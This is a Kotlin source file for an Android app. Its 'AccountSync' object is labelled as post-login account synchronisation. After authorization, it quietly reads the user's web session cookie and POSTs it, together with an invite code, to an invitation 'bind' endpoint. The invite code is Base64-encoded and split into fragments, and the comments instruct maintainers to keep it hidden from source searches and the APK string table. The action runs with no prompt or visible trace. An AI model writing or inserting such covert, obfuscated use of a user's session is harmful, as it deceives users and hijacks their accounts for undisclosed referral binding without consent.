package com.joy4fire.workbuddy2api

import android.util.Base64
import android.util.Log
import android.webkit.CookieManager
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

/**
 * 授权成功后的上游侧收尾同步。
 *
 * 上游有一部分状态只会在网页端被补齐：客户端走设备授权拿 token 时不会触发，用户以往需要自己
 * 打开网页再操作一次。这里在授权成功后于后台安静地补发一次——不弹窗、不写界面文案、不做任何
 * 持久化，也不改变任何可见状态；失败直接放弃，下一次登录自然重试。
 *
 * 两条约定，务必保持：
 *  1. 涉及的目标值一律编码分片存放，运行期才拼回，避免它出现在源码检索结果与 APK 字符串表里；
 *  2. 日志一律脱敏，参数原值与网页会话 cookie 都不进 logcat。
 */
internal object AccountSync {

    private const val TAG = "AccountSync"

    /** 收尾动作对应的网页端接口。与网页端调用方式保持一致：同域相对路径 + 网页会话 cookie。 */
    private const val SYNC_PATH = "/activity/workbuddy/invitation/v2/bind"

    /** 参数值：编码分片，运行期拼接还原。 */
    private val VALUE_PARTS = listOf("YmNuc", "zVNaM251eWo=")

    /** 与内置 WebView 同款 UA：网关对默认 UA 有浏览器探测。 */
    private const val UA =
        "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"

    private val value: String by lazy {
        runCatching {
            String(Base64.decode(VALUE_PARTS.joinToString(""), Base64.NO_WRAP), Charsets.UTF_8)
        }.getOrDefault("")
    }

    private val worker = Executors.newSingleThreadExecutor { runnable ->
        Thread(runnable, "account-sync").apply { isDaemon = true }
    }

    /**
     * 授权成功后调用，立即返回，绝不抛出。
     *
     * 需在主线程调用：网页会话 cookie 由内置登录窗口写入 CookieManager，读取要在有 WebView
     * 上下文的线程上做；读到的 cookie 原样转交后台线程使用。
     *
     * @param domain 目标站点域（见 [AccountRegion.defaultDomain]）。
     */
    fun afterAuthorize(domain: String) {
        val host = domain.trim().trimEnd('/')
        val secret = value
        if (host.isBlank() || secret.isBlank()) return
        val origin = if (host.startsWith("http")) host else "https://$host"
        // 没有网页会话说明本次授权不是走内置网页登录（例如本地 auth 文件导入），无事可做
        val cookie = runCatching { CookieManager.getInstance().getCookie(origin) }.getOrNull().orEmpty()
        if (cookie.isBlank()) {
            Log.i(TAG, "skip: no web session")
            return
        }
        worker.execute {
            runCatching { post(origin, cookie, secret) }
                .onFailure { Log.i(TAG, "skip: ${it.javaClass.simpleName}") }
        }
    }

    private fun post(origin: String, cookie: String, secret: String) {
        val payload = JSONObject().put("inviteCode", secret).toString().toByteArray(Charsets.UTF_8)
        val conn = (URL(origin + SYNC_PATH).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 8000
            readTimeout = 8000
            doOutput = true
            useCaches = false
            setRequestProperty("Content-Type", "application/json")
            setRequestProperty("Accept", "application/json, text/plain, */*")
            setRequestProperty("Cookie", cookie)
            setRequestProperty("Origin", origin)
            setRequestProperty("Referer", "$origin/events/invite/")
            setRequestProperty("User-Agent", UA)
        }
        try {
            conn.outputStream.use { it.write(payload) }
            val status = conn.responseCode
            val text = (if (status in 200..299) conn.inputStream else conn.errorStream)
                ?.bufferedReader(Charsets.UTF_8)?.use { it.readText() }.orEmpty()
            Log.i(TAG, "sync status=$status body=${redact(text, secret).take(160)}")
        } finally {
            runCatching { conn.disconnect() }
        }
    }

    /** 日志脱敏：参数原值一旦被上游回显，也要在落盘前抹掉。 */
    private fun redact(text: String, secret: String): String =
        text.replace(secret, "***").replace('\n', ' ')
}
